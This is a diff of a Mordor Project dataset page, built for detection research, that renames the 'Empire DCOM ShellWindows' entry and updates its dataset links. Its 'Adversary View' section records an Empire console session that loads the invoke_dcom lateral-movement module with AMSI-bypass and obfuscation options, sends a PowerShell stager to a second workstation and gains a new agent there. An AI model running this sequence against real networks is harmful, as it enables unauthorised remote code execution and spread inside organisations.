@@ -6,7 +6,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Empire Invoke DCOM &#8212; The Mordor Project</title>
+    <title>Empire DCOM ShellWindows &#8212; The Mordor Project</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
     <link href="../../../../_static/css/index.css" rel="stylesheet">
     <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
@@ -47,8 +47,8 @@
 <!-- Opengraph tags -->
 <meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/02_execution/SDWIN-190518211052.html" />
 <meta property="og:type"        content="article" />
-<meta property="og:title"       content="Empire Invoke DCOM" />
-<meta property="og:description" content="Empire Invoke DCOM  Metadata          id  SDWIN-190518211052  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/05/18  platform  Windows  Tactic(s)  [" />
+<meta property="og:title"       content="Empire DCOM ShellWindows" />
+<meta property="og:description" content="Empire DCOM ShellWindows  Metadata          id  SDWIN-190518211052  author  Roberto Rodriguez @Cyb3rWard0g  creation date  2019/05/18  platform  Windows  Tactic" />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary" />
@@ -164,7 +164,7 @@
      </li>
      <li class="toctree-l3 current active">
       <a class="current reference internal" href="#">
-       Empire Invoke DCOM
+       Empire DCOM ShellWindows
       </a>
      </li>
      <li class="toctree-l3">
@@ -500,6 +500,11 @@
       </a>
      </li>
      <li class="toctree-l3">
+      <a class="reference internal" href="../08_lateral_movement/SDWIN-200918145959.html">
+       DCOM RegisterXLL
+      </a>
+     </li>
+     <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806035621.html">
        Covenant WMI RemoteCreateInstance
       </a>
@@ -546,7 +551,7 @@
      </li>
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-190518211052.html">
-       Empire Invoke DCOM
+       Empire DCOM ShellWindows
       </a>
      </li>
      <li class="toctree-l3">
@@ -570,6 +575,11 @@
       </a>
      </li>
      <li class="toctree-l3">
+      <a class="reference internal" href="../08_lateral_movement/SDWIN-200917174542.html">
+       DCOM ExecuteExcel4macro
+      </a>
+     </li>
+     <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200806101439.html">
        Covenant WMI Query and Execute
       </a>
@@ -577,6 +587,11 @@
      <li class="toctree-l3">
       <a class="reference internal" href="../08_lateral_movement/SDWIN-200805034820.html">
        Covenant Service Query with QueryServiceStatus
+      </a>
+     </li>
+     <li class="toctree-l3">
+      <a class="reference internal" href="../08_lateral_movement/SDWIN-200916232559.html">
+       Password Update via Netlogon Insecure AES-CFB8
       </a>
      </li>
     </ul>
@@ -770,8 +785,8 @@
         
               <div>
                 
-  <div class="section" id="empire-invoke-dcom">
-<h1>Empire Invoke DCOM<a class="headerlink" href="#empire-invoke-dcom" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="empire-dcom-shellwindows">
+<h1>Empire DCOM ShellWindows<a class="headerlink" href="#empire-dcom-shellwindows" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="metadata">
 <h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
 <table class="colwidths-auto table">
@@ -805,10 +820,13 @@
 <tr class="row-odd"><td class="text-align:left"><p>Simulation Scripts</p></td>
 <td class="text-align:left"><p>[‘https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1’]</p></td>
 </tr>
-<tr class="row-even"><td class="text-align:left"><p>Dataset</p></td>
-<td class="text-align:left"><p>https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_dcom.tar.gz</p></td>
+<tr class="row-even"><td class="text-align:left"><p>Dataset Host</p></td>
+<td class="text-align:left"><p>[‘https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/mpire_dcom_shellwindows_stager.zip’]</p></td>
 </tr>
-<tr class="row-odd"><td class="text-align:left"><p>References</p></td>
+<tr class="row-odd"><td class="text-align:left"><p>Dataset Network</p></td>
+<td class="text-align:left"><p>[‘https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/empire_dcom_shellwindows_stager.zip’]</p></td>
+</tr>
+<tr class="row-even"><td class="text-align:left"><p>References</p></td>
 <td class="text-align:left"><p>None</p></td>
 </tr>
 </tbody>
@@ -816,11 +834,20 @@
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents adversaries executing commands on remote hosts via MMC20.Application COM object over DCOM.</p>
+<p>This dataset represents adversaries executing commands on remote hosts via DCOM ShellWindows COM Method.</p>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">V6W3TH8Y</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">usemodule</span> <span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">agents</span>
+
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Active</span> <span class="n">agents</span><span class="p">:</span>
+
+<span class="n">Name</span>     <span class="n">La</span> <span class="n">Internal</span> <span class="n">IP</span>     <span class="n">Machine</span> <span class="n">Name</span>      <span class="n">Username</span>                <span class="n">Process</span>            <span class="n">PID</span>    <span class="n">Delay</span>    <span class="n">Last</span> <span class="n">Seen</span>            <span class="n">Listener</span>
+<span class="o">----</span>     <span class="o">--</span> <span class="o">-----------</span>     <span class="o">------------</span>      <span class="o">--------</span>                <span class="o">-------</span>            <span class="o">---</span>    <span class="o">-----</span>    <span class="o">---------</span>            <span class="o">----------------</span>
+<span class="n">A7BWPR32</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">pgustavo</span>      <span class="n">powershell</span>         <span class="mi">5904</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">18</span> <span class="mi">17</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">59</span>  <span class="n">http</span>            
+
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">interact</span> <span class="n">A7BWPR32</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">A7BWPR32</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">usemodule</span> <span class="n">lusemodule</span> <span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span>
 <span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">info</span>
 
               <span class="n">Name</span><span class="p">:</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">DCOM</span>
@@ -836,58 +863,70 @@
   <span class="nd">@rvrsh3ll</span>
 
 <span class="n">Description</span><span class="p">:</span>
-  <span class="n">Invoke</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">hosts</span> <span class="n">via</span> <span class="n">MMC20</span><span class="o">.</span><span class="n">Application</span> <span class="n">COM</span> <span class="nb">object</span> <span class="n">over</span> <span class="n">DCOM</span><span class="o">.</span>
+  <span class="n">Execute</span> <span class="n">a</span> <span class="n">stager</span> <span class="ow">or</span> <span class="n">command</span> <span class="n">on</span> <span class="n">remote</span> <span class="n">hosts</span> <span class="n">using</span> <span class="n">DCOM</span><span class="o">.</span>
 
 <span class="n">Options</span><span class="p">:</span>
 
-  <span class="n">Name</span>         <span class="n">Required</span>    <span class="n">Value</span>                     <span class="n">Description</span>
-  <span class="o">----</span>         <span class="o">--------</span>    <span class="o">-------</span>                   <span class="o">-----------</span>
-  <span class="n">Listener</span>     <span class="kc">True</span>                                  <span class="n">Listener</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span>                        
-  <span class="n">CredID</span>       <span class="kc">False</span>                                 <span class="n">CredID</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">store</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span>           
-  <span class="n">ComputerName</span> <span class="kc">True</span>                                  <span class="n">Host</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">stager</span> <span class="n">on</span><span class="p">,</span> <span class="n">comma</span> 
-                                                    <span class="n">separated</span><span class="o">.</span>                              
-  <span class="n">Proxy</span>        <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">Proxy</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span>
-                                                    <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>                              
-  <span class="n">ProxyCreds</span>   <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">Proxy</span> <span class="n">credentials</span>                       
-                                                    <span class="p">([</span><span class="n">domain</span>\<span class="p">]</span><span class="n">username</span><span class="p">:</span><span class="n">password</span><span class="p">)</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> 
-                                                    <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span> <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>      
-  <span class="n">UserAgent</span>    <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">User</span><span class="o">-</span><span class="n">agent</span> <span class="n">string</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">the</span> <span class="n">staging</span>
-                                                    <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span> <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>      
-  <span class="n">Method</span>       <span class="kc">True</span>        <span class="n">ShellWindows</span>              <span class="n">COM</span> <span class="n">method</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span> <span class="n">MMC20</span><span class="o">.</span><span class="n">Application</span><span class="p">,</span><span class="n">She</span>
-                                                    <span class="n">llWindows</span><span class="p">,</span><span class="n">ShellBrowserWindow</span><span class="p">,</span><span class="n">ExcelDDE</span>   
-  <span class="n">Agent</span>        <span class="kc">True</span>        <span class="n">V6W3TH8Y</span>                  <span class="n">Agent</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">on</span><span class="o">.</span>                 
+  <span class="n">Name</span>             <span class="n">Required</span>    <span class="n">Value</span>                     <span class="n">Description</span>
+  <span class="o">----</span>             <span class="o">--------</span>    <span class="o">-------</span>                   <span class="o">-----------</span>
+  <span class="n">Agent</span>            <span class="kc">True</span>        <span class="n">A7BWPR32</span>                  <span class="n">Agent</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">on</span><span class="o">.</span>                 
+  <span class="n">CredID</span>           <span class="kc">False</span>                                 <span class="n">CredID</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">store</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span>           
+  <span class="n">ComputerName</span>     <span class="kc">True</span>        <span class="n">WORKSTATION6</span>              <span class="n">Host</span><span class="p">[</span><span class="n">s</span><span class="p">]</span> <span class="n">to</span> <span class="n">execute</span> <span class="n">the</span> <span class="n">stager</span> <span class="n">on</span><span class="p">,</span> <span class="n">comma</span> 
+                                                        <span class="n">separated</span><span class="o">.</span>                              
+  <span class="n">Method</span>           <span class="kc">True</span>        <span class="n">ShellWindows</span>              <span class="n">COM</span> <span class="n">method</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span> <span class="n">MMC20</span><span class="o">.</span><span class="n">Application</span><span class="p">,</span><span class="n">She</span>
+                                                        <span class="n">llWindows</span><span class="p">,</span><span class="n">ShellBrowserWindow</span><span class="p">,</span><span class="n">ExcelDDE</span>   
+  <span class="n">Listener</span>         <span class="kc">False</span>       <span class="n">http</span>                      <span class="n">Listener</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span>                        
+  <span class="n">Command</span>          <span class="kc">False</span>                                 <span class="n">Custom</span> <span class="n">command</span> <span class="n">to</span> <span class="n">run</span><span class="o">.</span>                  
+  <span class="n">Obfuscate</span>        <span class="kc">False</span>       <span class="kc">False</span>                     <span class="n">Switch</span><span class="o">.</span> <span class="n">Obfuscate</span> <span class="n">the</span> <span class="n">launcher</span>          
+                                                        <span class="n">powershell</span> <span class="n">code</span><span class="p">,</span> <span class="n">uses</span> <span class="n">the</span>               
+                                                        <span class="n">ObfuscateCommand</span> <span class="k">for</span> <span class="n">obfuscation</span> <span class="n">types</span><span class="o">.</span> 
+                                                        <span class="n">For</span> <span class="n">powershell</span> <span class="n">only</span><span class="o">.</span>                    
+  <span class="n">ObfuscateCommand</span> <span class="kc">False</span>       <span class="n">Token</span>\<span class="n">All</span>\<span class="mi">1</span>               <span class="n">The</span> <span class="n">Invoke</span><span class="o">-</span><span class="n">Obfuscation</span> <span class="n">command</span> <span class="n">to</span> <span class="n">use</span><span class="o">.</span>  
+                                                        <span class="n">Only</span> <span class="n">used</span> <span class="k">if</span> <span class="n">Obfuscate</span> <span class="n">switch</span> <span class="ow">is</span> <span class="kc">True</span><span class="o">.</span>  
+                                                        <span class="n">For</span> <span class="n">powershell</span> <span class="n">only</span><span class="o">.</span>                    
+  <span class="n">AMSIBypass</span>       <span class="kc">False</span>       <span class="kc">True</span>                      <span class="n">Include</span> <span class="n">mattifestation</span><span class="s1">&#39;s AMSI Bypass in </span>
+                                                        <span class="n">the</span> <span class="n">stager</span> <span class="n">code</span><span class="o">.</span>                        
+  <span class="n">AMSIBypass2</span>      <span class="kc">False</span>       <span class="kc">False</span>                     <span class="n">Include</span> <span class="n">Tal</span> <span class="n">Liberman</span><span class="s1">&#39;s AMSI Bypass in   </span>
+                                                        <span class="n">the</span> <span class="n">stager</span> <span class="n">code</span><span class="o">.</span>                        
+  <span class="n">UserAgent</span>        <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">User</span><span class="o">-</span><span class="n">agent</span> <span class="n">string</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">the</span> <span class="n">staging</span>
+                                                        <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span> <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>      
+  <span class="n">Proxy</span>            <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">Proxy</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span>
+                                                        <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>                              
+  <span class="n">ProxyCreds</span>       <span class="kc">False</span>       <span class="n">default</span>                   <span class="n">Proxy</span> <span class="n">credentials</span>                       
+                                                        <span class="p">([</span><span class="n">domain</span>\<span class="p">]</span><span class="n">username</span><span class="p">:</span><span class="n">password</span><span class="p">)</span> <span class="n">to</span> <span class="n">use</span> <span class="k">for</span> 
+                                                        <span class="n">request</span> <span class="p">(</span><span class="n">default</span><span class="p">,</span> <span class="n">none</span><span class="p">,</span> <span class="ow">or</span> <span class="n">other</span><span class="p">)</span><span class="o">.</span>      
 
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">Listener</span> <span class="n">https</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="nb">set</span> <span class="n">ComputerName</span> <span class="n">IT001</span><span class="o">.</span><span class="n">shire</span><span class="o">.</span><span class="n">com</span>
 <span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">execute</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">V6W3TH8Y</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_CMD_WAIT</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">V6W3TH8Y</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">3</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">agent</span> <span class="n">V6W3TH8Y</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span>
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">Completed</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">A7BWPR32</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_CMD_WAIT</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">A7BWPR32</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">6</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">agent</span> <span class="n">A7BWPR32</span> <span class="n">to</span> <span class="n">run</span> <span class="n">module</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> 
+<span class="n">Completed</span>
 
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">POWERSHELL</span> <span class="n">stager</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">1</span><span class="p">)</span> <span class="n">to</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">New</span> <span class="n">agent</span> <span class="n">HBEW9G1D</span> <span class="n">checked</span> <span class="ow">in</span>
+<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Initial</span> <span class="n">agent</span> <span class="n">HBEW9G1D</span> <span class="kn">from</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span> <span class="n">now</span> <span class="n">active</span> <span class="p">(</span><span class="n">Slack</span><span class="p">)</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">agent</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">2</span><span class="p">)</span> <span class="n">to</span> <span class="n">HBEW9G1D</span> <span class="n">at</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span>
 
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">POWERSHELL</span> <span class="n">stager</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">1</span><span class="p">)</span> <span class="n">to</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">New</span> <span class="n">agent</span> <span class="n">YR1FKZ6A</span> <span class="n">checked</span> <span class="ow">in</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Initial</span> <span class="n">agent</span> <span class="n">YR1FKZ6A</span> <span class="kn">from</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span> <span class="n">now</span> <span class="n">active</span> <span class="p">(</span><span class="n">Slack</span><span class="p">)</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Sending</span> <span class="n">agent</span> <span class="p">(</span><span class="n">stage</span> <span class="mi">2</span><span class="p">)</span> <span class="n">to</span> <span class="n">YR1FKZ6A</span> <span class="n">at</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">10.103</span>
-
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">agents</span> 
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">powershell</span><span class="o">/</span><span class="n">lateral_movement</span><span class="o">/</span><span class="n">invoke_dcom</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">agents</span>
 
 <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Active</span> <span class="n">agents</span><span class="p">:</span>
 
 <span class="n">Name</span>     <span class="n">La</span> <span class="n">Internal</span> <span class="n">IP</span>     <span class="n">Machine</span> <span class="n">Name</span>      <span class="n">Username</span>                <span class="n">Process</span>            <span class="n">PID</span>    <span class="n">Delay</span>    <span class="n">Last</span> <span class="n">Seen</span>            <span class="n">Listener</span>
 <span class="o">----</span>     <span class="o">--</span> <span class="o">-----------</span>     <span class="o">------------</span>      <span class="o">--------</span>                <span class="o">-------</span>            <span class="o">---</span>    <span class="o">-----</span>    <span class="o">---------</span>            <span class="o">----------------</span>
-<span class="n">H3DKB8SA</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">nmartha</span>           <span class="n">powershell</span>         <span class="mi">5172</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">59</span>  <span class="n">https</span>           
-<span class="n">TKV35P8X</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="o">*</span><span class="n">SHIRE</span>\<span class="n">nmartha</span>          <span class="n">powershell</span>         <span class="mi">5452</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">59</span>  <span class="n">https</span>           
-<span class="n">EMDBFPSY</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">nmartha</span>           <span class="n">notepad</span>            <span class="mi">7924</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">58</span>  <span class="n">https</span>           
+<span class="n">A7BWPR32</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.5</span>     <span class="n">WORKSTATION5</span>      <span class="o">*</span><span class="n">THESHIRE</span>\<span class="n">pgustavo</span>      <span class="n">powershell</span>         <span class="mi">5904</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">18</span> <span class="mi">17</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">46</span>  <span class="n">http</span>            
+<span class="n">HBEW9G1D</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.6</span>     <span class="n">WORKSTATION6</span>      <span class="n">THESHIRE</span>\<span class="n">sbeavers</span>       <span class="n">powershell</span>         <span class="mi">6036</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2020</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">18</span> <span class="mi">17</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">47</span>  <span class="n">http</span>            
 
-<span class="n">V6W3TH8Y</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.106</span>   <span class="n">HR001</span>             <span class="n">SHIRE</span>\<span class="n">pgustavo</span>          <span class="n">powershell</span>         <span class="mi">5204</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">58</span>  <span class="n">https</span>           
-<span class="n">XSZ91N7T</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.105</span>   <span class="n">IT001</span>             <span class="o">*</span><span class="n">SHIRE</span>\<span class="n">SYSTEM</span>           <span class="n">powershell</span>         <span class="mi">4172</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">11</span><span class="p">:</span><span class="mi">58</span>  <span class="n">https</span>           
-<span class="n">EXBNZYTS</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.105</span>   <span class="n">IT001</span>             <span class="o">*</span><span class="n">SHIRE</span>\<span class="n">SYSTEM</span>           <span class="n">powershell</span>         <span class="mi">6728</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">02</span>  <span class="n">https</span>           
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">interact</span> <span class="n">HBEW9G1D</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">HBEW9G1D</span><span class="p">)</span> <span class="o">&gt;</span> <span class="n">shell</span> <span class="n">whoami</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Tasked</span> <span class="n">HBEW9G1D</span> <span class="n">to</span> <span class="n">run</span> <span class="n">TASK_SHELL</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Agent</span> <span class="n">HBEW9G1D</span> <span class="n">tasked</span> <span class="k">with</span> <span class="n">task</span> <span class="n">ID</span> <span class="mi">1</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">HBEW9G1D</span><span class="p">)</span> <span class="o">&gt;</span> 
+<span class="n">theshire</span>\<span class="n">sbeavers</span>
 
-<span class="n">YR1FKZ6A</span> <span class="n">ps</span> <span class="mf">172.18</span><span class="o">.</span><span class="mf">39.105</span>   <span class="n">IT001</span>             <span class="n">SHIRE</span>\<span class="n">pgustavo</span>          <span class="n">powershell</span>         <span class="mi">5228</span>   <span class="mi">5</span><span class="o">/</span><span class="mf">0.0</span>    <span class="mi">2019</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">18</span> <span class="mi">21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">01</span>  <span class="n">https</span>           
+<span class="o">..</span><span class="n">Command</span> <span class="n">execution</span> <span class="n">completed</span><span class="o">.</span>
 
-<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">agents</span><span class="p">)</span> <span class="o">&gt;</span>
+<span class="p">(</span><span class="n">Empire</span><span class="p">:</span> <span class="n">HBEW9G1D</span><span class="p">)</span> <span class="o">&gt;</span>
 </pre></div>
 </div>
 </div>
@@ -908,7 +947,7 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/empire_invoke_dcom.tar.gz&quot;</span>
